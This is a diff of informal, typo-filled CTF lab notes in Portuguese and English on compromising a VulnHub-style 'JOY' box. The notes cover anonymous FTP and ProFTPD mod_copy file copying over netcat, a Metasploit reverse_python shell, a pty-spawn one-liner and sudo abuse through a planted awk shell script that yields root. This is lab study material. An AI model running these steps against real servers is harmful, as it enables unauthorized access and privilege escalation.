@@ -1,5 +1,7 @@
 
 # CTF 30 days or 30 maq VM to hacker.
+Playlist
+https://www.youtube.com/watch?v=xnCS8fYfrjs&list=PLHBDBcFA_l_WBcUJWf8cp5BaPsUkquRQU
 
 ## Virtual Box Setupt : Creating your virtual network lab 
 
@@ -61,23 +63,84 @@ https://www.vulnhub.com/entry/droopy-v02,143/
 
 -Resultado da Varredura - 
    PORT    STATE SERVICE     VERSION
-21/tcp  open  ftp         ProFTPD
-22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
-25/tcp  open  smtp        Postfix smtpd
-80/tcp  open  http        Apache httpd 2.4.25
-110/tcp open  pop3        Dovecot pop3d
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-143/tcp open  imap        Dovecot imapd
-445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-465/tcp open  smtp        Postfix smtpd
-587/tcp open  smtp        Postfix smtpd
-993/tcp open  ssl/imaps?
-995/tcp open  ssl/pop3s?
+-21/tcp  open  ftp         ProFTPD * anonymous 
+-22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
+-25/tcp  open  smtp        Postfix smtpd
+-80/tcp  open  http        Apache httpd 2.4.25
+-110/tcp open  pop3        Dovecot pop3d
+-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+-143/tcp open  imap        Dovecot imapd
+-445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+-465/tcp open  smtp        Postfix smtpd
+-587/tcp open  smtp        Postfix smtpd
+-993/tcp open  ssl/imaps?
+-995/tcp open  ssl/pop3s?
 
 Service Info: Hosts: The,  JOY.localdomain, 127.0.1.1, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 2. Enumeração
 
-1. 
+1. ftp <host> can use terminal ou tabs windows. anyway
+- serach files for anyting important.
+-rwxrwxr-x   1 ftp      ftp         26009 Nov 18 23:06 directory * interisting
+
+2. nc <host> 21 * open door 
+nc 10.10.10.11 21
+220 The Good Tech Inc. FTP Server
+site cpfr /home/patrick/version_control
+350 File or directory exists, ready for destination name
+site cpto /home/ftp/version_control
+250 Copy successful
+
+1.2 ftp <host>
+
+get version_control * Ready this ^^bagaça^^ 
+site path was changedm pay atention.
+
+3. msfconsole 
+search proftpd 
+use * mode copy *
+options 
+pay atentio *
+sitepath, payload my casa I used set payload ^^cmd/unix/reverse_python^^ and exploit or run.
+be csi and find what metter.
+
+tattol this on your head=> python -c "import pty; pty.spawn('/bin/bash')'
+
+su <usr>
+su -l <look for perm>
+
+3. Armamento wepon
+
+echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test
+
+3.1 ftp put <virys>
+
+3.2 nc <host> 21
+nc 10.10.10.11 21
+220 The Good Tech Inc. FTP Server
+site cpfr /home/ftp/test * cpfr => copy fron 
+350 File or directory exists, ready for destination name
+site cpto /home/patrick/script/test * cpto => copy to ^^this path on patrick root acess.
+250 Copy successful
+421 Login timeout (300 seconds): closing control connection
+
+4. sersrsrsrs
+   msfconsole 
+sudo /home/patrick/script/test
+
+whoami 
+root baby
+
+
+
+                                                              
+
+
+
+
+
+
+
    
